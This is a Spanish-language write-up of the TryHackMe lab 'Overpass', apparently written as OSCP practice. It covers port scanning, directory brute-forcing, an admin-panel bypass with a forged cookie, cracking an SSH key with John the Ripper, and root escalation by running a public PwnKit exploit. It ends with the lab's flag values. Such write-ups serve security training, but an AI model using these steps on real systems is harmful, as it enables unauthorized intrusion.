# 📍 Overpass

> 🔊 Plataforma: TryHackMe  
> 🛡️ Nivel de dificultad: Fácil  
> 💡 Preparación OSCP - **igneosec**

---

## 🗕️ Información general

- **Nombre de la máquina**: Overpass  
- **Dirección IP**: 10.10.133.101  
- **Sistema operativo**: Linux (Ubuntu)  
- **Tipo de acceso / Vector de entrada**: Página web (fuga de clave SSH)

---

## 🔍 Enumeración

### 🔹 Escaneo de puertos

```bash
nmap -sS -v -n -p- -oN firstscan --min-rate=5000 10.10.133.101 -Pn
```

> Puertos detectados:
- 22/tcp → ssh
- 80/tcp → http

### 🔹 Detección de versiones y servicios

```bash
nmap -sCV -p22,80 -oN scanOpenPorts 10.10.133.101
```

> Resultados clave:
- OS: Linux (Ubuntu)
- SSH: OpenSSH 7.6p1
- HTTP: Servidor Golang (Go-IPFS JSON-RPC o InfluxDB API)
- Página principal muestra frontend de "Overpass"

### 🔹 Fuerza bruta de directorios

```bash
gobuster dir -u http://10.10.133.101/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 40
```

> Rutas interesantes encontradas:
- `/downloads` → binarios multiplataforma y código fuente en Go
- `/admin` → panel de administración protegido por login

---

## 💡 Enumeración web útil

- ✅ Al explorar la ruta `/downloads`, obtenemos el binario `overpassLinux` y su código fuente `overpass.go`
- ❌ Estudiamos el binario y el código: emplea ROT47 para cifrar credenciales guardadas en `~/.overpass`. Sin acceso al fichero real en la máquina víctima, no fue útil.
- ✅ Durante el análisis del código fuente, detectamos que el usuario "james" aparece en rutas del entorno de desarrollo (`/mnt/c/Users/James/...`) y dentro de cadenas relacionadas con el uso del programa, deduciendo que probablemente fuese un usuario del sistema.
- ✅ También identificamos los archivos JS `login.js` y `cookie.js`. Observamos que el token `SessionToken` se setea en cliente al autenticar, pero **no se valida en el backend**.
- ✅ Esto nos permite falsificar la autenticación con una cookie arbitraria:

```bash
curl -L -s -b "SessionToken=valor_cualquiera" http://10.10.133.101/admin
```

- ✅ Se accede así al panel `/admin`, donde encontramos una clave privada RSA cifrada `id_rsa.enc`

### 🔐 Crackeo de clave RSA

```bash
# 1. Convertimos el archivo cifrado a hash
ssh2john id_rsa.enc > id_rsa.hash

# 2. Lanzamos John the Ripper con rockyou.txt
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

> Contraseña descubierta: **`james13`**

---

## 🌟 Explotación

### 🔥 Confirmación de acceso SSH

```bash
ssh -i id_rsa.enc james@10.10.133.101
# Contraseña: james13
```

> Acceso conseguido como usuario `james`

---

## 📦 Post-Explotación

### 🔐 Enumeración con LinPEAS

- Ejecutamos `linpeas.sh` → se detecta vulnerabilidad **CVE-2021-4034** (Polkit - PwnKit)

### ⚡️ Escalado de privilegios

```bash
git clone https://github.com/A1vinSmith/CVE-2021-4034
cd CVE-2021-4034
python3 CVE-2021-4034.py
```

> Acceso como `root` conseguido

---

## 🏋️ Flags encontradas

### ✅ Flag 1
- **Ruta**: `/home/james/user.txt`
- **Contenido**: `thm{65c1aaf000506e56996822c6281e6bf7}`

### ✅ Flag 2 (root)
- **Ruta**: `/root/root.txt`
- **Contenido**: `thm{7f336f8c359dbac18d54fdd64ea753bb}`

---

## 📚 Lecciones aprendidas

- Aplicación web vulnerable con validación cliente (cookie sin comprobación en backend)
- Lógica de autenticación comprometida → acceso manual al panel admin
- Usuario "james" inferido del análisis de strings del binario de `overpassLinux`
- Clave SSH cifrada crackeada con `John the Ripper`
- Escalado local mediante CVE conocido y validado con LinPEAS

---

📄 Writeup finalizado.

📊 Parte del laboratorio ofensivo: [https://github.com/igneosec](https://github.com/igneosec)
